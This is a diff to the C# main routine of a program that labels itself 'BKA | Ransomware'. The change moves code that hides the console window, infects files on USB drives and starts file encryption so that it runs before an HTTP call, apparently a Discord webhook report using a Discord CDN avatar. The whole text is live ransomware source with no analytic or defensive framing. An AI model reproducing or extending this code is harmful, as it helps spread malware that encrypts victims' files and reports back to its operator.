@@ -49,7 +49,16 @@ namespace Stub
         static async Task Main()
         {
           
-            string avatarUrl = "https://cdn.discordapp.com/attachments/1118947131034710016/1138401446589636628/WYEYq4P.jpg";
+         
+
+
+            var handle = GetConsoleWindow();
+            ShowWindow(handle, SW_HIDE);
+            Console.Title = "NYA :3";
+            Console.Write("Starting...");
+            infecting.Infectrandomusbfile();
+            Encryption.Start();
+               string avatarUrl = "https://cdn.discordapp.com/attachments/1118947131034710016/1138401446589636628/WYEYq4P.jpg";
             string username = "BKA | Ransomware";
 
             using (HttpClient client = new HttpClient())
@@ -71,14 +80,6 @@ namespace Stub
 
 
             }
-
-
-            var handle = GetConsoleWindow();
-            ShowWindow(handle, SW_HIDE);
-            Console.Title = "NYA :3";
-            Console.Write("Starting...");
-            infecting.Infectrandomusbfile();
-            Encryption.Start();
         }
     }
 }
